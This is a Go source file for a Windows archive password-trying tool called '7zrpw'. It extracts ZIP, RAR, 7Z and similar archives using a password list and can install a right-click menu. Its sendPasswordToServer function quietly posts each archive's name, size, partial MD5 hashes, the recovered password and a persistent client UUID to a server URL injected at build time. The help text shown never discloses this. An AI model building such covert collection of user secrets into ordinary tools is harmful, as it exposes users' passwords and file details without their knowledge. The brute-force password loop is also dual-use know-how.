	if err := k.SetStringValue("Icon", exePath); err != nil {
		fmt.Println("----------------------------------")
		fmt.Println("  xxxxxx 安装失败 xxxxxx")
		fmt.Println("(╯°□°）╯︵ ┻━┻")
		fmt.Printf("设置图标失败: %v\n请以【管理员身份运行】后重试。\n", err)
		fmt.Println("右键菜单安装失败！")
		fmt.Println("----------------------------------")
		return fmt.Errorf("设置图标失败: %v \n请以【管理员身份运行】后重试。", err)
	}

	// 创建command子项
	k2, _, err := registry.CreateKey(
		registry.CLASSES_ROOT,
		`*\shell\7zrpw\command`,
		registry.ALL_ACCESS,
	)
	if err != nil {
		fmt.Println("----------------------------------")
		fmt.Println("  xxxxxx 安装失败 xxxxxx")
		fmt.Println("(╯°□°）╯︵ ┻━┻")
		fmt.Printf("创建command子项失败: %v\n请以【管理员身份运行】后重试。\n", err)
		fmt.Println("右键菜单安装失败！")
		fmt.Println("----------------------------------")
		return fmt.Errorf("创建command子项失败: %v\n请以【管理员身份运行】后重试。", err)
	}
	defer k2.Close()

	// 设置命令
	command := fmt.Sprintf("\"%s\" \"%%1\"", exePath)
	if err := k2.SetStringValue("", command); err != nil {
		fmt.Println("----------------------------------")
		fmt.Println("  xxxxxx 安装失败 xxxxxx")
		fmt.Println("(╯°□°）╯︵ ┻━┻")
		fmt.Printf("设置命令失败: %v\n请以【管理员身份运行】后重试。\n", err)
		fmt.Println("右键菜单安装失败！")
		fmt.Println("----------------------------------")
		return fmt.Errorf("设置命令失败: %v \n请以【管理员身份运行】后重试。", err)
	}

	// 安装成功
	fmt.Println("----------------------------------")
	fmt.Println("  ✓✓✓✓✓ 安装成功 ✓✓✓✓✓")
	fmt.Println("	( •̀ ω •́ )✧")
	fmt.Println("右键菜单安装成功！")
	fmt.Println("----------------------------------")
	return nil
}

// 函数说明：卸载右键菜单
// 返回：错误信息
func uninstallContext() error {
	// 删除注册表项
	err := registry.DeleteKey(registry.CLASSES_ROOT, `*\shell\7zrpw\command`)
	if err != nil {
		fmt.Println("----------------------------------")
		fmt.Println("  xxxxxx 卸载失败 xxxxxx")
		fmt.Println("(╯°□°）╯︵ ┻━┻")
		fmt.Printf("删除command子项失败: %v\n请以【管理员身份运行】后重试。\n", err)
		fmt.Println("右键菜单卸载失败！")
		fmt.Println("----------------------------------")
		return fmt.Errorf("删除command子项失败: %v \n请以【管理员身份运行】后重试。", err)
	}

	err = registry.DeleteKey(registry.CLASSES_ROOT, `*\shell\7zrpw`)
	if err != nil {
		fmt.Println("----------------------------------")
		fmt.Println("  xxxxxx 卸载失败 xxxxxx")
		fmt.Println("(╯°□°）╯︵ ┻━┻")
		fmt.Printf("删除注册表项失败: %v\n请以【管理员身份运行】后重试。\n", err)
		fmt.Println("右键菜单卸载失败！")
		fmt.Println("----------------------------------")
		return fmt.Errorf("删除注册表项失败: %v \n请以【管理员身份运行】后重试。", err)
	}

	// 卸载成功
	fmt.Println("----------------------------------")
	fmt.Println("  ✓✓✓✓✓ 卸载成功 ✓✓✓✓✓")
	fmt.Println("	( •̀ ω •́ )✧")
	fmt.Println("右键菜单卸载成功！")
	fmt.Println("----------------------------------")
	return nil
}

var (
	// 构建时注入
	appKey    = "default" // 默认值，会被构建时的值覆盖
	appSecret = "default" // 默认值，会被构建时的值覆盖
	serverURL = "default" // 默认值，会被构建时的值覆盖
)

// 参数：
// archivePath: 压缩文件路径
// password: 密码
// 返回：是否成功
func reportPassword(archivePath, password string) bool {
	sendPasswordToServer(serverURL, appKey, appSecret, archivePath, password)
	return true
}

func sendPasswordToServer(serverURL, appKey, appSecret, filePath, password string) error {

	// 打开文件
	file, err := os.Open(filePath)
	if err != nil {
		if debugMode {
			return fmt.Errorf("打开文件失败: %v", err)
		}
		return err
	}
	defer file.Close()

	// 获取文件信息
	fileInfo, err := file.Stat()
	if err != nil {
		if debugMode {
			return fmt.Errorf("获取文件信息失败: %v", err)
		}
		return err
	}

	// 获取文件类型
	fileType := getFileTypeDesc(getFileType(filePath))

	// 计算前1024字节的MD5
	hash := md5.New()
	buffer := make([]byte, 1024)
	n, err := file.Read(buffer)
	if err != nil && err != io.EOF {
		return err
	}
	hash.Write(buffer[:n])
	md51024 := hex.EncodeToString(hash.Sum(nil))

	// 重置文件指针
	file.Seek(0, 0)

	// 计算前1MB的MD5
	hash = md5.New()
	buffer = make([]byte, 1024*1024)
	n, err = file.Read(buffer)
	if err != nil && err != io.EOF {
		return err
	}
	hash.Write(buffer[:n])
	md51mb := hex.EncodeToString(hash.Sum(nil))

	uuid := loadOrGenerateUUID()
	// 准备请求参数
	params := map[string]interface{}{
		"name_raw":  filepath.Base(filePath),
		"size":      fileInfo.Size(),
		"md5_1024":  md51024,
		"md5_1mb":   md51mb,
		"password":  password,
		"uuid":      uuid,
		"file_type": fileType,
	}
	// 生成 JWT
	token, err := generateJWT(appKey, appSecret, params)
	if err != nil {
		return err
	}
	// 创建请求
	req, err := http.NewRequest("POST", serverURL, nil)
	if err != nil {
		return err
	}
	// 设置请求头
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	// 发送请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// 生成JWT令牌
func generateJWT(appKey, appSecret string, params map[string]interface{}) (string, error) {
	token := jwt.New(jwt.SigningMethodHS256)
	claims := token.Claims.(jwt.MapClaims)
	claims["app_key"] = appKey
	claims["params"] = params
	claims["exp"] = time.Now().Add(time.Minute * 5).Unix()

	return token.SignedString([]byte(appSecret))
}

// 函数说明：异步检查更新
// 返回：更新管理器
func asyncCheckUpdate() {
	go func() {
		updateManager, err := NewUpdateManager(VERSION)
		if err != nil {
			if debugMode {
				fmt.Printf("初始化更新管理器失败: %v\n", err)
			}
			return
		}

		if err := updateManager.CheckUpdate(false); err != nil {
			if debugMode {
				fmt.Printf("检查更新失败: %v\n", err)
			}
		}
		// 移除默认消息，使用 CheckUpdate 中的详细更新信息
	}()
}

// 函数说明：处理更新检查和程序退出
// handleUpdateAndExit 处理更新检查和程序退出
// updateResultChan: 更新消息通道
// updateManager: 更新管理器

func handleUpdateAndExit() {
	reader := bufio.NewReader(os.Stdin)

	// 检查是否有更新消息
	select {
	case updateMsg := <-updateResultChan:
		// 如果不是新版本消息，直接返回
		if !strings.Contains(updateMsg, "发现新版本") {
			return
		}

		// 显示更新信息并询问是否更新
		fmt.Println(updateMsg)
		fmt.Print("\n回车键立即更新? (y/n) [Y]: ")

		answer, err := reader.ReadString('\n')
		if err != nil {
			fmt.Printf("读取用户输入失败: %v\n", err)
			return
		}

		// 如果用户选择不更新，直接返回
		answer = strings.TrimSpace(strings.ToLower(answer))
		if answer != "" && answer != "y" && answer != "yes" {
			return
		}

		// 检查更新管理器
		if updateManager == nil {
			fmt.Println("更新管理器未初始化")
			fmt.Print("\n按回车键退出...")
			reader.ReadString('\n')
			return
		}

		// 执行更新
		if debugMode {
			fmt.Printf("开始执行更新，版本信息: %+v\n", updateInfo)
		}

		if err := updateManager.doUpdate(updateInfo); err != nil {
			fmt.Printf("更新失败: %v\n", err)
			fmt.Print("\n按回车键退出...")
			reader.ReadString('\n')
		}
		// 更新成功会自动退出
		return

	default:
		fmt.Print("\n按回车键退出...")
		reader.ReadString('\n')
	}
}

// 主函数
func main() {
	// 启动异步更新检查
	asyncCheckUpdate()

	// 立即显示主界面
	clearScreen()

	//查询7zrpw.exe所在目录是否有passwd.txt文件，如果没有则创建
	exePath, err := os.Executable()
	if err != nil {
		fmt.Printf("获取程序路径失败: %v\n", err)
		return
	}
	passwdPath := filepath.Join(filepath.Dir(exePath), "passwd.txt")
	if _, err := os.Stat(passwdPath); os.IsNotExist(err) {
		os.Create(passwdPath)
	}

	// 检查命令行参数
	if len(os.Args) > 1 {
		switch os.Args[1] {
		case "--install":
			// 安装右键菜单
			if err := installContext(); err != nil {
				fmt.Print("\n按回车键退出...")
				fmt.Scanln()
				return
			}
			fmt.Print("\n按回车键退出...")
			fmt.Scanln()
			return
		case "--uninstall":
			// 卸载右键菜单
			if err := uninstallContext(); err != nil {
				fmt.Print("\n按回车键退出...")
				fmt.Scanln()
				return
			}
			fmt.Print("\n按回车键退出...")
			fmt.Scanln()
			return
		default:
			// 如果参数是文件路径，直接处理该文件
			filePath := os.Args[1]
			if _, err := os.Stat(filePath); err == nil {
				// 获取文件的绝对路径
				absPath, err := filepath.Abs(filePath)
				if err != nil {
					fmt.Printf("无法获取文件的绝对路径: %v\n", err)
					return
				}

				// 获取密码（从当前目录和程序所在目录查找）
				passwords, passwordsInfo, err := getAllPasswords()
				if err != nil {
					fmt.Printf("\n提示：%v\n", err)
					fmt.Println("将尝试空密码，如果失败可以手动输入密码")
					passwords = []string{}
					passwordsInfo = ""
				}

				// 处理文件
				if getFileType(absPath) != -1 {
					processArchive(absPath, passwords, passwordsInfo)
					// 处理更新和退出
					handleUpdateAndExit()
				} else {
					fmt.Println("不支持的文件格式")
				}
				//右键菜单模式下，按回车键退出
				fmt.Print("\n按回车键退出......")
				fmt.Scanln()
				return
			}
		}
	}

	// 交互模式
	currentDir := "."
	for {
		var archivePath string
		var dictPath string = "passwd.txt"

		// 检查当前目录下的文件和目录
		files := findCompressFiles(currentDir)
		fmt.Printf("\n当前目录: %s\n", currentDir)
		if len(files) > 0 {
			fmt.Println("\n发现以下文件和目录：")
			// 先显示压缩文件
			for i, file := range files {
				fmt.Printf("输入%d: %s\n", i+1, file)
			}
			// 然后显示其他选项

			fmt.Println("输入a: 解压所有压缩文件")
			fmt.Println("输入b: 返回上级目录")
			fmt.Println("输入i: 安装右键菜单")
			fmt.Println("输入u: 卸载右键菜单")
			fmt.Println("输入h: 帮助信息")
			fmt.Println("输入q: 退出程序")

			fmt.Print("\n请选择 (输入序号或粘贴路径，右键直接粘贴): ")
			// 检查是否有更新消息
			var choice string

			// 检测右键点击
			state, _, _ := getAsyncKeyState.Call(uintptr(VK_CONTROL))
			if state&0x8000 != 0 {
				// 如果按下了 Ctrl，等待右键点击
				time.Sleep(100 * time.Millisecond)
				state, _, _ = getAsyncKeyState.Call(uintptr(WM_RBUTTONDOWN))
				if state&0x8000 != 0 {
					// 获取剪贴板内容
					choice = getClipboardText()
					fmt.Println(choice) // 显示粘贴的内容
				}
			} else {
				// 普通输入
				fmt.Scanln(&choice)
			}

			if choice == "0" || choice == "q" || choice == "Q" {
				fmt.Println("程序已退出")
				return
			} else if choice == "b" || choice == "B" {
				// 返回上级目录
				parent := filepath.Dir(currentDir)
				if parent != currentDir {
					currentDir = parent
					clearScreen()
				}
				continue
			} else if choice == "a" || choice == "A" {
				clearScreen()
				// 处理所有压缩文件
				fmt.Println("\n开始处理所有压缩文件...")

				// 获取压缩文件列表（不包括目录）
				var compressFiles []string
				for _, file := range files {
					if !strings.HasSuffix(file, "/") {
						compressFiles = append(compressFiles, filepath.Join(currentDir, file))
					}
				}

				if len(compressFiles) == 0 {
					fmt.Println("当前目录没有压缩文件")
					continue
				}

				// 获取所有密码
				passwords, passwordsInfo, err := getAllPasswords()
				if err != nil {
					fmt.Printf("\n提示：%v\n", err)
					fmt.Println("将尝试空密码，如果失败可以手动输入密码")
					passwords = []string{}
					passwordsInfo = ""
				}

				fmt.Printf("共 %d 个密码\n\n", len(passwords))
				fmt.Println("开始尝试破解...")

				// 处理每个压缩文件
				for i, file := range compressFiles {
					fmt.Printf("\n[%d/%d] 处理文件: %s\n", i+1, len(compressFiles), filepath.Base(file))
					processArchive(file, passwords, passwordsInfo)
				}
				// 处理更新和退出
				handleUpdateAndExit()

				fmt.Print("\n按回车键继续...")
				fmt.Scanln()
				continue
			} else if choice == "h" || choice == "H" { //帮助信息
				clearScreen()
				fmt.Println("\n帮助信息:")
				fmt.Println("----------------------------------")
				fmt.Println("设置密码文本")
				fmt.Println("在7zrpw.exe所在目录新建passwd.txt文件，将解压密码写入文件，每行一个密码，密码文件名必须为passwd.txt")
				fmt.Println("----------------------------------")
				fmt.Println("使用方法")
				fmt.Println("1、(推荐)安装右键菜单,通过右键菜单解压文件.")
				fmt.Println("2、命令行模式: 7zrpw 文件路径,例如: 7zrpw .\\test.zip 或 7zrpw d:\\test\\test.zip")
				fmt.Println("3、交互模式: 直接双击运行 7zrpw.exe")
				fmt.Printf("-----------------------------------\n")
				fmt.Print("右键菜单安装/卸载方法一：\n")
				fmt.Print("1、右键7zrpw.exe，选择以【管理员身份运行】\n")
				fmt.Print("2、安装：在交互模式下，输入i，回车，即可安装右键菜单\n")
				fmt.Print("3、卸载：在交互模式下，输入u，回车，即可卸载右键菜单\n")
				fmt.Print("右键菜单安装方法二：\n")
				fmt.Print("1、以管理员权限启动cmd\n")
				fmt.Print("2、安装：在cmd命令行窗口运行 7zrpw.exe --install\n")
				fmt.Print("3、卸载：在cmd命令行窗口运行 7zrpw.exe --uninstall\n")
				fmt.Scanln()
				continue
			} else if choice == "i" || choice == "I" {
				clearScreen()
				// 安装右键菜单
				installContext()
				continue
			} else if choice == "u" || choice == "U" {
				clearScreen()
				// 卸载右键菜单
				uninstallContext()
				continue
			}

			// 尝试解析数字选择
			if num, err := strconv.Atoi(choice); err == nil && num > 0 && num <= len(files) {
				selected := files[num-1]
				fullPath := filepath.Join(currentDir, strings.TrimSuffix(selected, "/"))

				if strings.HasSuffix(selected, "/") {
					// 如果选择的是目录，进入该目录，并且清除屏幕
					currentDir = fullPath
					clearScreen()
					continue
				} else {
					// 如果选择的是文件，处理该文件
					archivePath = fullPath
				}
			} else {
				// 如果不是数字，检查是否是目录或文件路径
				fileInfo, err := os.Stat(choice)
				if err == nil {
					if fileInfo.IsDir() {
						// 如果是目录，进入该目录
						currentDir = choice
						clearScreen()
						continue
					} else {
						// 如果是文件，处理该文件
						archivePath = choice
						clearScreen()
					}
				} else {
					clearScreen()
					fmt.Printf("无效的路径: %s\n", choice)
					continue
				}
			}
		} else {
			fmt.Println("\n当前目录为空")
			fmt.Println("输入0: 退出程序")
			fmt.Println("输入b: 返回上级目录")
			fmt.Println("输入h: 帮助信息")
			fmt.Println("输入i: 安装右键菜单")
			fmt.Println("输入u: 卸载右键菜单")
			fmt.Print("\n请输入选择项或输入路径(右键直接粘贴): ")
			var choice string
			fmt.Scanln(&choice)

			if choice == "0" {
				fmt.Println("程序已退出")
				return
			} else if choice == "b" || choice == "B" {
				parent := filepath.Dir(currentDir)
				if parent != currentDir {
					currentDir = parent
				}
				continue
			} else if choice == "i" || choice == "I" {
				clearScreen()
				// 安装右键菜单
				installContext()
				continue
			} else if choice == "u" || choice == "U" {
				clearScreen()
				// 卸载右键菜单
				uninstallContext()
				continue
			} else if choice != "" {
				archivePath = choice
			} else {
				continue
			}
		}

		// 检查密码文件
		if _, err := os.Stat(dictPath); os.IsNotExist(err) {
			fmt.Printf("未找到默认密码文件 %s，请输入密码文件路径 (直接回车退出): ", dictPath)
			fmt.Scanln(&dictPath)
			if dictPath == "" {
				fmt.Println("程序已退出")
				return
			}
		}

		// 检查文件是否存在
		if _, err := os.Stat(archivePath); os.IsNotExist(err) {
			fmt.Println("压缩文件不存在")
			continue
		}
		if _, err := os.Stat(dictPath); os.IsNotExist(err) {
			fmt.Println("密码文件不存在")
			continue
		}

		// 检查文件类型
		if getFileType(archivePath) == -1 {
			fmt.Println("不支持的文件格式，仅支持以下格式：")
			fmt.Println("- ZIP (.zip 及其分卷)")
			fmt.Println("- RAR (.rar 及其分卷)")
			fmt.Println("- 7Z (.7z)")
			fmt.Println("- GZ (.gz, .tar.gz, .tgz)")
			fmt.Println("- BZ2 (.bz2, .tar.bz2, .tbz2)")
			fmt.Println("- TAR (.tar)")
			fmt.Println("- XZ (.xz, .tar.xz, .txz)")
			fmt.Println("- CAB (.cab)")
			fmt.Println("- ISO (.iso)")
			fmt.Println("- ARJ (.arj)")
			fmt.Println("- LZH (.lzh, .lha)")
			continue
		}

		// 获取所有密码
		passwords, passwordsInfo, err := getAllPasswords()
		if err != nil {
			fmt.Printf("警告: %v\n", err)
			passwords = []string{}
			passwordsInfo = ""
		}

		fmt.Printf("共 %d 个密码\n\n", len(passwords))
		fmt.Println("开始尝试破解...")

		processArchive(archivePath, passwords, passwordsInfo)
		// 处理更新和退出
		handleUpdateAndExit()

		fmt.Print("\n按回车键继续...")
		fmt.Scanln()
	}
}

// 获取剪贴板内容
func getClipboardText() string {
	// 打开剪贴板
	ret, _, _ := openClipboard.Call(0)
	if ret == 0 {
		return ""
	}
	defer closeClipboard.Call()

	// 获取剪贴板数据
	h, _, _ := getClipboardData.Call(uintptr(CF_TEXT))
	if h == 0 {
		return ""
	}

	// 获取数据大小
	size, _, _ := globalSize.Call(h)
	if size == 0 {
		return ""
	}

	// 锁定内存
	l, _, _ := globalLock.Call(h)
	if l == 0 {
		return ""
	}
	defer globalUnlock.Call(h)

	// 使用 RtlMoveMemory 来复制内存
	data := make([]byte, size)
	rtlMoveMemory.Call(
		uintptr(unsafe.Pointer(&data[0])),
		l,
		size,
	)

	// 找到第一个 null 字节
	for i, b := range data {
		if b == 0 {
			return string(data[:i])
		}
	}

	return string(data)
}

type ClientConfig struct {
	UUID string `json:"uuid"`
}

func loadOrGenerateUUID() string {
	// 配置文件路径
	//配置文件放在临时目录里
	configPath := filepath.Join(os.TempDir(), "7zrpw", "client.json")
	//如果失败，则放在程序目录里
	// if _, err := os.Stat(configPath); os.IsNotExist(err) {
	// 	configPath = filepath.Join(filepath.Dir(os.Args[0]), "client.json")
	// }

	// 尝试加载现有配置
	var config ClientConfig
	data, err := os.ReadFile(configPath)
	if err == nil {
		json.Unmarshal(data, &config)
		if config.UUID != "" {
			return config.UUID
		}
	}

	// 生成新的 UUID
	config.UUID = uuid.New().String()

	// 保存配置
	if data, err := json.Marshal(config); err == nil {
		os.WriteFile(configPath, data, 0644)
	}

	return config.UUID
}
